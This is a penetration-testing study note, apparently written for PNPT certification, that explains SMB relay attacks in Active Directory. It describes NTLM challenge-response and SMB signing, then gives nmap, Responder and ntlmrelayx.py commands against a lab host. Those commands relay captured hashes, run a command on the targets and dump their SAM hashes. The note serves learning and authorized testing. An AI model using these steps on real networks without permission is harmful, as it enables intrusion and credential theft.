
# SMB Relay Attack
In an [SMB](/networking/protocols/SMB.md)-Relay attack, instead of attempting to crack the hashes gathered from the network with [Responder](/PNPT/PEH/active-directory/initial-vectors/responder.md), an attacker relays those hashes to other machines in the hopes that *one will allow them to gain access*.
## Basic Flow
SMB Relay takes advantage of regular authentication attempts by common automated systems on a network. These automated systems perform regular management tasks on devices on the network. To do so, they attempt to logon/ authenticate with any device which connects to the network using [NTLM](/networking/protocols/NTLM.md).
### Normal Function
The service tries to authenticate with the server. The server responds with a challenge, usually 'if you're really the user you say you are, then encrypt this challenge with the user's *password hash* and send it back.'

The service on the client encrypts the challenge w/ the user's password and sends the new value back to the server. The server decrypts the answer with the user's password and, if it decrypts to the original challenge it sent, it authenticates the service.
### Exploitation
An attacker can exploit this vulnerable exchange by capturing the traffic b/w the service and the server, modifying it, and essentially hijacking the authentication by the server of the service (the attacking machine gets authenticated instead).

By hijacking the authentication, the attacker gains access *to the target server which sent the challenge*.
![](PNPT/PNPT-pics/smbrelay.png)
> [Cowdex](https://cowdex.github.io/posts/smb-relay-attack/)
#### Requirements:
- SMB Signing disabled
- Admin credentials: the relayed user credentials *must be admin credentials* or you don't gain much from obtaining them. 
- Additionally, you can't relay the credentials to yourself (attacker). The credential *must be relayed to a different computer*.
## Exploitation
### Identify Hosts without SMB signing
First, we have to find hosts on the target network which have SMB signing disabled.
#### What is SMB signing?
SMB signing is a security mechanism added to the SMB protocol by Microsoft starting with Windows 2000. It protects the integrity of messages sent b/w a client and a server by signing each message with a signature generated via the session key.

This *prevents tampering of the message* by an attacker because any tampering will *change the hash*, thus signaling to the system that the message was compromised in-transit.
#### Using [nmap](/CLI-tools/linux/nmap.md)
Nmap has a script which will report back which hosts on the network have SMB signing disabled. To run it, just use:
```bash
┌──(hakcypuppy㉿kali)-[~]
└─$ nmap --script=smb2-security-mode.nse -p139,445 10.10.10.175
Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-27 14:40 GMT
Nmap scan report for egotistical-bank.local (10.10.10.175)
Host is up (0.040s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required  # here

Nmap done: 1 IP address (1 host up) scanned in 1.23 seconds
```
Regardless of the number of targets which come back as not requiring SMB signing, add each one to a file called `targets.txt`.
### Relay w/ [Responder](/cybersecurity/tools/exploitation/responder.md) & `smbrelayx.py`
Once we've found a good host, we're going to use a combination of Responder and `smbrelayx.py`to capture a hash and then relay if (using our own server) to the target.

First, we have to update our Responder configuration so it doesn't act as the server (since the impacket script will do that for us).
`/usr/share/responder/responder.conf`
```bash
[Responder Core]                                                           
; Servers to start                                                                
SQL = On                                                                        
SMB = Off    # this should be off
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off   # this should be off                                                     ...
```
#### Responder
The command we give to responder will tell Responder to listen on our specified interface and passively capture hashes on the network:
```bash
respnder -I eth0 -dwPv
```
- `d`: [DHCP](/networking/protocols/DHCP.md) (allows Responder to answer DHCP broadcast requests)
- `w`: [WPAD](/computers/windows/active-directory/WPAD.md) proxy server
- `P`: ProxyAuth (forces NTLM authentication)
- `v`: verbose
#### `ntlmrelayx.py`
The `ntlmrelayx.py` script is from python [impacket](/cybersecurity/tools/exploitation/impacket.md) which will handle relaying the hashes captured by responder to the target devices.
```bash
ntlmrelayx.py -tf targets.txt -smb2support -c 'whoami'
```
- `tf`: target file
- `-smb2support`: support SMB version 2
- `-c`: command to execute on target system
#### Success
Upon successful relay to the target, impacket will print the local SAM hashes for accounts on the target device. Ideally, one of those will be from an Administrator account.

> [!Resources]
> - [Microsoft: Overview of SMB signing](https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/overview-server-message-block-signing)
> - [Mark Baggett: SMB Relay Demystified...](https://www.sans.org/blog/smb-relay-demystified-and-ntlmv2-pwnage-with-python/)
> - [Cowdex: SMB Relay Attack](https://cowdex.github.io/posts/smb-relay-attack/)
> - My other notes (linked throughout), all of which can be found [here](https://github.com/TrshPuppy/obsidian-notes)


